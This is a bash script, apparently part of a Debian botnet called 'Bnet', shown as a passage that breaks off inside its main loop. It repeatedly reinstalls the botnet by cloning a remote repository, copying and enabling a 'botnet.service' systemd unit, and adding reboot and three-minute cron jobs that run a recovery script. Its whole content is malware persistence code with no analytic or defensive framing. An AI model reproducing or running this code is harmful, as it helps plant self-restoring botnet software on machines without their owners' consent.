#Har har Mahadev
#!/bin/bash


# Folder check
folder="/usr/share/Bnet"

while true; do
    if [ ! -d "$folder" ]; then
       
        git clone [link]
        cp Debian_based_botne/Bnet/botnet.service /etc/systemd/system/
        #  Debian_based_botne
        cp -r Debian_based_botne/Bnet /usr/share/ 
        cd /usr/share/Bnet/ && chmod +x mrdarksage.sh post-check.sh pre-check.sh recover_bnet.sh install.sh 
        systemctl enable botnet.service
        systemctl start botnet.service 
        systemctl daemon-reload
        (crontab -l ; echo "@reboot sleep 60 && /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -
        (crontab -l ; echo "*/3 * * * * /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -

    fi

    sleep 5 

    # botnet.service check
    service_name="botnet.service"

    if ! systemctl is-active --quiet "$service_name"; then

        systemctl daemon-reload
        systemctl enable botnet.service
        systemctl start botnet.service 

    serv_file="/etc/systemd/system/botnet.service"
    elif [[ ! -d "$serv_file" ]]; then
        
        systemctl daemon-reload
        cp /usr/share/Bnet/botnet.service /etc/systemd/system/
        systemctl enable botnet.service
        systemctl start botnet.service 
        systemctl daemon-reload


    fi

    sleep 5  
